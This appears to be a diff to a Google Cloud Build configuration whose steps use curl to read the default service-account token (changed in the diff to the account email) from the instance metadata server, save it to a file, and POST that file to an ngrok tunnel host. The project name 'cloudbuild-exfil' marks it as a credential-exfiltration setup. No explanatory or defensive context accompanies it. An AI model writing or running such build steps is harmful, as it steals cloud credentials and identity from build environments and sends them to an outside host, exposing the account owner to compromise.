@@ -1,16 +1,16 @@
 steps:
 - name: 'launcher.gcr.io/google/ubuntu1604'
   entrypoint: 'curl'
-  args: ['http://03d52c041573.ngrok.io']
+  args: ['http://e1e6f0638177.ngrok.io']
 
 # GET data from a server, specifying an Authorization header.
 - name: 'launcher.gcr.io/google/ubuntu1604'
   entrypoint: 'curl'
-  args: ['-o', 'file.out', "--header", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"]
+  args: ['-o', 'file.out', "--header", "Metadata-Flavor: Google", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"]
 
 # POST information to a server, specifying a Content-type header.
 - name: 'launcher.gcr.io/google/ubuntu1604'
   entrypoint: 'curl'
-  args: ['--header', 'Content-type: application/json"', '--data', '@file.out', 'http://03d52c041573.ngrok.io']
+  args: ['--header', 'Content-type: application/json"', '--data', '@file.out', 'http://s.ngrok.io']
 
 images: ['gcr.io/cloudbuild-exfil/curl']
